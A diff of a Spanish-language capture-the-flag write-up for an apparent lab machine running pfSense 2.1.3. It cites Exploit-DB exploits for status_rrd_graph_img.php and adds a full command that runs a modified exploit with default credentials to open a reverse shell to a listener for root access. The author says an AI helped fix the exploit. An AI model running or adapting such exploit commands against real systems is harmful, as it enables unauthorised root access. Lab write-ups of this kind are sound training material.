@@ -38,6 +38,9 @@ Así que probaré el usuario más la contraseña default de la aplicación Pfsen
 
 ![](Pasted%20image%2020260424173406.png) 
 
-Podemos observar que es la versión 2.1.3 la cuál buscando encontré este script https://www.exploit-db.com/exploits/43560 que no me funcionó, así que use este otro que es sobre la misma vulnerabilidad que tiene que ver con status_rrd_graph_img.php https://www.exploit-db.com/exploits/39709. Debemos interceptar la petición hacia el fichero php.
+Podemos observar que es la versión 2.1.3 la cuál buscando encontré este script https://www.exploit-db.com/exploits/43560 que no me funcionó, así que gracias a la IA pude modificarlo y hacer que funcione correctamente, el cuál añadiré a la carpeta. Simplemente lo ejecutamos como indica y al poner en escucha tendremos exitosamente acceso al sistema y desde root consiguiendo las dos flags.
+```bash
+python3 43560.py --rhost 10.129.24.14 --lhost 10.10.14.180 --lport 4444 --username rohit --password pfsense
+```
 
-![](Pasted%20image%2020260424180446.png)
+![](Pasted%20image%2020260424183920.png)
